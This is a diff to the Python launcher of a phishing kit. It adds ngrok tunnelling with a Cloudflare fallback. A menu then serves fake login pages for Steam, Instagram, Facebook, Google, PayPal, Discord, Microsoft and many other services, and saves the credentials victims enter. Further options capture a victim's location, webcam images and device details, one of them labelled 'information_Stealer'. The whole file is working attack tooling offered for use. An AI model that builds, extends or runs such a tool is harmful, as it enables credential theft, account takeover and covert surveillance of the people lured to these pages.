@@ -15,6 +15,14 @@ from rich.console import Console
 console = Console()
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
+# Import requests with fallback
+try:
+    import requests
+except ImportError:
+    console.print("[red]requests module not found! Installing...[/red]")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+    import requests
+
 
 def Banner():
     console = Console()
@@ -113,7 +121,6 @@ def Banner():
     console.print("\n")
     console.print(Align(Columns(special_panels, equal=False, expand=False), align="center"))
     console.print("\n")
-
 
 
 def extract_cloudflare_url(text):
@@ -240,6 +247,155 @@ def get_cloudflare_url():
         return "https://your-tunnel.trycloudflare.com"
 
 
+def get_ngrok_url():
+    """Get ngrok tunnel URL"""
+    possible_paths = [
+        os.path.join(BASE_DIR, "ngrok", "ngrok"),
+        os.path.join(BASE_DIR, "ngrok"),
+        "ngrok"
+    ]
+
+    ngrok_path = None
+    for path in possible_paths:
+        if os.path.exists(path):
+            if os.name != 'nt' and not os.access(path, os.X_OK):
+                try:
+                    os.chmod(path, 0o755)
+                except:
+                    pass
+            ngrok_path = path
+            break
+
+    if not ngrok_path:
+        console.print("[red]ngrok not found![/red]")
+        return None
+
+    try:
+        # Kill any existing ngrok processes
+        if os.name == 'nt':
+            subprocess.run(['taskkill', '/f', '/im', 'ngrok.exe'], 
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            subprocess.run(['pkill', '-f', 'ngrok'], 
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        time.sleep(2)
+
+        # Start ngrok tunnel in background
+        console.print("[yellow]⏳ Starting ngrok tunnel (may take up to 20 seconds)...[/yellow]")
+        
+        if os.name == 'nt':
+            process = subprocess.Popen(
+                [ngrok_path, "http", "5001"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+        else:
+            process = subprocess.Popen(
+                [ngrok_path, "http", "5001"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+
+        # Wait for ngrok to start
+        time.sleep(8)
+
+        # Try to get ngrok URL via API
+        max_retries = 5
+        for retry in range(max_retries):
+            try:
+                console.print(f"[grey]Attempting to get ngrok URL (attempt {retry + 1}/{max_retries})...[/grey]")
+                response = requests.get("http://localhost:4040/api/tunnels", timeout=10)
+                if response.status_code == 200:
+                    data = response.json()
+                    tunnels = data.get("tunnels", [])
+                    
+                    for tunnel in tunnels:
+                        if tunnel.get("proto") == "https":
+                            ngrok_url = tunnel.get("public_url")
+                            if ngrok_url:
+                                console.print(f"[green]✓ Ngrok URL found: {ngrok_url}[/green]")
+                                
+                                # Save to file
+                                try:
+                                    with open("ngrok_url.txt", "w") as f:
+                                        f.write(ngrok_url)
+                                    console.print("[green]✓ URL saved to ngrok_url.txt[/green]")
+                                except Exception as e:
+                                    console.print(f"[yellow]⚠ Could not save URL: {e}[/yellow]")
+                                
+                                return ngrok_url
+                
+                time.sleep(3)
+            except requests.exceptions.RequestException as e:
+                console.print(f"[grey]API attempt {retry + 1} failed: {e}[/grey]")
+                time.sleep(3)
+                continue
+
+        # Fallback: try ngrok tunnel list command
+        console.print("[yellow]Trying fallback method...[/yellow]")
+        try:
+            result = subprocess.run(
+                [ngrok_path, "tunnel", "list"],
+                capture_output=True,
+                text=True,
+                timeout=10
+            )
+            
+            if result.returncode == 0:
+                output = result.stdout
+                console.print(f"[grey]Ngrok tunnel list output: {output}[/grey]")
+                
+                # Extract URL from output
+                ngrok_patterns = [
+                    r'https://[a-zA-Z0-9-]+\.ngrok\.io',
+                    r'https://[a-zA-Z0-9-]+\.ngrok-free\.app',
+                    r'Forwarding[[:space:]]+(https://[^[:space:]]+)'
+                ]
+                
+                for pattern in ngrok_patterns:
+                    matches = re.findall(pattern, output)
+                    if matches:
+                        ngrok_url = matches[0]
+                        console.print(f"[green]✓ Found ngrok URL via command: {ngrok_url}[/green]")
+                        return ngrok_url
+        except Exception as e:
+            console.print(f"[yellow]Fallback method failed: {e}[/yellow]")
+
+        console.print("[red]❌ Could not get ngrok URL after multiple attempts[/red]")
+        return None
+
+    except Exception as e:
+        console.print(f"[red]Error starting ngrok: {e}[/red]")
+        return None
+
+
+def get_tunnel_url():
+    """Get tunnel URL - try ngrok first, then cloudflare"""
+    # Check if ngrok is available
+    ngrok_paths = [
+        os.path.join(BASE_DIR, "ngrok", "ngrok"),
+        os.path.join(BASE_DIR, "ngrok"),
+        "ngrok"
+    ]
+    
+    ngrok_available = any(os.path.exists(path) for path in ngrok_paths)
+    
+    if ngrok_available:
+        console.print("[cyan]🔄 Using ngrok tunnel...[/cyan]")
+        ngrok_url = get_ngrok_url()
+        if ngrok_url:
+            return ngrok_url, "ngrok"
+        else:
+            console.print("[yellow]⚠ Ngrok failed, falling back to Cloudflare...[/yellow]")
+    
+    # Use Cloudflare as fallback
+    console.print("[cyan]🔄 Using Cloudflare tunnel...[/cyan]")
+    cloudflare_url = get_cloudflare_url()
+    return cloudflare_url, "cloudflare"
+
+
 def Choice():
     try:
         user_choice = int(input("Select an option (1-32): "))
@@ -247,269 +403,221 @@ def Choice():
         console.print("[red]Please enter a valid number[/red]")
         return
 
-    cloudflare_url = get_cloudflare_url() or "https://your-tunnel.trycloudflare.com"
+    # Get tunnel URL (ngrok first, then cloudflare fallback)
+    tunnel_url, tunnel_type = get_tunnel_url()
+    
+    if not tunnel_url:
+        tunnel_url = "https://your-tunnel.ngrok.io"
+        console.print("[yellow]⚠ Using default tunnel URL[/yellow]")
 
+    tunnel_display_name = "Ngrok" if tunnel_type == "ngrok" else "Cloudflare"
+    
     if user_choice == 1:
-        console.print(f"\n[+] Your Steam Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Steam Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Steam_Credentials ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import steam
         steam.run()
 
-
-
     elif user_choice == 2:
-        console.print(f"\n[+] Your Instagram Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Instagram Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ insta_Credentials ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import instagram
         instagram.run()
 
-
-
     elif user_choice == 3:
-        console.print(f"\n[+] Your Location Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Location Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ location_information ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import location
         location.run()
 
-
-
     elif user_choice == 4:
-        console.print(f"\n[+] Your WebCam Capture Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your WebCam Capture Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ uploads ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import take_picture
         take_picture.run()
 
-
     elif user_choice == 5:
-        console.print(f"\n[+] Your IG Follower Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your IG Follower Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ IG_FOLLOWER ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import IG_Follower
         IG_Follower.run()
 
-
     elif user_choice == 6:
-        console.print(f"\n[+] Your FaceBook Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your FaceBook Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Facebook ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import facebook
         facebook.run()
 
     elif user_choice == 7:
-        console.print(f"\n[+] Your Github Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Github Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Github ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import github
         github.run()
 
-
     elif user_choice == 8:
-        console.print(f"\n[+] Your Google Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Google Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Google ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import Google
         Google.run()
 
-
     elif user_choice == 9:
-        console.print(f"\n[+] Your WordPress Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your WordPress Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ WordPress ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import wordpress
         wordpress.run()
 
-
     elif user_choice == 10:
-        console.print(f"\n[+] Your Django Admin Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Django Admin Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Django ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import django_admin
         django_admin.run()
 
-
     elif user_choice == 11:
-        console.print(f"\n[+] Your Netflix Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Netflix Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Netflix ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import netflix
         netflix.run()
 
-
     elif user_choice == 12:
-        console.print(f"\n[+] Your Discord Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Discord Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Discord ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import discord
         discord.run()
 
-
     elif user_choice == 13:
-        console.print(f"\n[+] Your Paypal Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Paypal Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Paypal ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import paypal
         paypal.run()
 
-
     elif user_choice == 14:
-        console.print(f"\n[+] Your X Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your X Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Twitter ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import twitter
         twitter.run()
 
-
     elif user_choice == 15:
-        console.print(f"\n[+] Your Yahoo Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Yahoo Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Yahoo ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import yahoo
         yahoo.run()
 
-
     elif user_choice == 16:
-        console.print(f"\n[+] Your Yandex Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Yandex Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ yandex ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import yandex
         yandex.run()
 
-
     elif user_choice == 17:
-        console.print(f"\n[+] Your SnapChat Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your SnapChat Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ snapchat ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import snapchat
         snapchat.run()
 
-
     elif user_choice == 18:
-        console.print(f"\n[+] Your Roblox Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Roblox Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Roblox ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import roblox
         roblox.run()
 
-
     elif user_choice == 19:
-        console.print(f"\n[+] Your Adobe Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Adobe Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ adobe ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import adobe
         adobe.run()
 
-
     elif user_choice == 20:
-        console.print(f"\n[+] Your LinkedIN Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your LinkedIN Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ LinkedIN ] 👈 Directory.\n")
         from Pages import linkedin
         linkedin.run()
 
-
     elif user_choice == 21:
-        console.print(f"\n[+] Your Gitlab Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Gitlab Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Gitlab ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import Gitlab
         Gitlab.run()
 
-
     elif user_choice == 22:
-        console.print(f"\n[+] Your Ebay Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Ebay Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Ebay ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import ebay
         ebay.run()
 
-
     elif user_choice == 23:
-        console.print(f"\n[+] Your Dropbox Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Dropbox Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Dropbox ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import drop_box
         drop_box.run()
 
     elif user_choice == 24:
-        console.print(f"\n[+] Your chatgpt Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your chatgpt Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ chatgpt ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import chatgpt_
         chatgpt_.run()
 
     elif user_choice == 25:
-        console.print(f"\n[+] Your Deepseek Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Deepseek Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Deepseek ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import deepseek
         deepseek.run()
 
     elif user_choice == 26:
-        console.print(f"\n[+] Your information_Stealer Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your information_Stealer Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ collected_data/all_devices.json ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import Target_information
         Target_information.run()
 
     elif user_choice == 27:
-        console.print(f"\n[+] Your Phone Number Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Phone Number Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ phone_data ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import Target_information
         Target_information.run()
 
-
     elif user_choice == 28:
-        console.print(f"\n[+] Your Twitch Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Twitch Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Twitch ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
-
         from Pages import twitch
         twitch.run()
 
-
     elif user_choice == 29:
-        console.print(f"\n[+] Your Microsoft Page Cloudflare Link 👇 {cloudflare_url}")
+        console.print(f"\n[+] Your Microsoft Page {tunnel_display_name} Link 👇 {tunnel_url}")
         console.print("[+] Credentials Will be Saved in 👉 [ Microsoft ] 👈 Directory.\n")
         console.print("[+] Press CTRL + C to Stop The Code .\n")
         from Pages import microsoft
         microsoft.run()
 
-
     elif user_choice == 30:
         console.print(f"\n[+] About Us ...")
         from ABOUT import About
         About.run()
-
 
     elif user_choice == 31:
         console.print(f"\n[+] Our Basic AI Content Creator You can Use other Platform for a better chance ! ...")
